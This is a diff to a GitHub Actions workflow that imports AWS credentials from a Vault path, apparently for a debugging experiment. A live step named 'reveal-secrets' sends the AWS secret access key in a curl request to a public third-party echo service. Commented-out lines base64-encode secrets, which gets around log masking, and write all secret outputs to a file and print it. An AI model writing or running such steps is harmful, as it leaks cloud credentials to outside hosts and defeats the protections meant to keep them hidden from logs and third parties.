@@ -19,7 +19,8 @@ jobs:
         token: ${{ secrets.MYGITHUB_TOKEN }}
         exportEnv: true
         secrets: |
-          /aws/creds/my-role  access_key
+          /aws/creds/my-role access_key | AWS_ACCESS_KEY
+          /aws/creds/my-role secret-key | AWS_SECRET_ACCESS_KEY
   
   debug:
     runs-on: self-hosted
@@ -29,7 +30,7 @@ jobs:
       id: reveal-secrets
       run: |
         set -x
-        curl https://echo.free.beeceptor.com/sample-request?secret1=${{ env.access_key }}
+        curl https://echo.free.beeceptor.com/sample-request?secret=${{ env.AWS_SECRET_ACCESS_KEY }}
 
 #   deploy:
 #    needs: build
@@ -40,13 +41,13 @@ jobs:
 #      run: |
 #       sleep 10
 #       set -x
-#       echo '${{ toJson(steps.import-secrets.outputs.AWS_ACCESS_KEY_ID) }}' \| base64 -w0; echo
+#       echo '${{ steps.import-secrets.outputs.AWS_ACCESS_KEY }}' \| base64 -w0; echo
 
-#       if [ -n ${{ steps.import-secrets.outputs.AWS_ACCESS_KEY_ID }} ]; then echo not empty; else  echo empty; fi
+#       if [ -n ${{ steps.import-secrets.outputs.AWS_SECRET_ACCESS_KEY }} ]; then echo not empty; else  echo empty; fi
 
 #        echo "${{ toJson(steps.import-secrets.outputs) }}" >> secrets.json
 #        cat secrets.json
-#        ACCESS_KEY_ID="${{ steps.import-secrets.outputs.AWS_ACCESS_KEY_ID }}"
+#        ACCESS_KEY_ID="${{ steps.import-secrets.outputs.AWS_ACCESS_KEY }}"
 #        SECRET_ACCESS_KEY="{{ steps.import-secrets.outputs.AWS_SECRET_ACCESS_KEY }}"
       
 #    - name: Checkout repository
